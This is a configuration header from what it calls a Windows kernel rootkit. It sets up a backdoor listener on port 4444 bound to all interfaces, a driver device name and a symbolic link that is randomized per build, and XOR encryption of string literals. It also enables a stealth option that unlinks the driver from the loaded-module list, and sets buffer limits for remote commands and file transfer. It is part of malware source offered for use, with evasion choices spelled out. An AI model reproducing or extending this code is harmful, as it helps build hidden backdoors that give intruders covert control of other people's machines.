/*==============================================================================
 * rootkit/inc/config.h
 *------------------------------------------------------------------------------
 * Build-time configuration for the rootkit.
 * Every value here is either a #define baked at compile time or a
 * per-build constant the operator is expected to rotate.
 *
 * NOTE: After modifying this file, re-run build\build.bat to apply changes.
 *============================================================================*/
#pragma once

/*==============================================================================
 * NETWORK CONFIGURATION
 *----------------------------------------------------------------------------*/
/* Listen address. {0,0,0,0} == INADDR_ANY (bind to all interfaces). */
#define BIND_IP_OCTETS   {0, 0, 0, 0}

/* Backdoor port (host byte order). Default: 4444 */
#define BACKDOOR_PORT    4444

/*==============================================================================
 * DEVICE / SYMBOLIC LINK NAMES
 *----------------------------------------------------------------------------*/
/* Device object name (kernel namespace). */
#define DEVICE_NAME     L"\\Device\\KdmpRt"

/* Symbolic link name (user-mode namespace: \\.\KdmpRt).
 * The build script randomizes this per-build; this is the fallback. */
#define SYMLINK_NAME    L"\\??\\KdmpRt"

/*==============================================================================
 * POOL TAG
 *----------------------------------------------------------------------------*/
/* Four-character pool tag for all allocations (NonPagedPoolNx).
 * Use 'Kdmp' -> 0x706D644B in little-endian. */
#define POOL_TAG        'Kdmp'

/*==============================================================================
 * OBFUSCATION
 *----------------------------------------------------------------------------*/
/* Per-build XOR key for string literal encryption.
 * build.bat rewrites this via xorstr.py preprocessor. */
#define XOR_KEY         0x5A

/*==============================================================================
 * STEALTH BEHAVIOR
 *----------------------------------------------------------------------------*/
/* If 1: stealth_deinit() re-links the driver in PsLoadedModuleList on unload.
 * If 0: unlink is permanent (driver disappears cleanly from module list). */
#define RELINK_ON_UNLOAD    1

/*==============================================================================
 * RUNTIME LIMITS
 *----------------------------------------------------------------------------*/
/* System thread stack size for the WSK listener thread. */
#define LISTENER_STACK_SIZE 0x4000

/* Maximum single response / command buffer size (64 KB). */
#define NET_BUF_MAX         0x10000

/* Maximum bytes per file read/write chunk (4 MB). */
#define FILE_CHUNK_MAX      0x400000

/* Retry count for transient WSK IRP failures. */
#define WSK_RETRY_MAX       3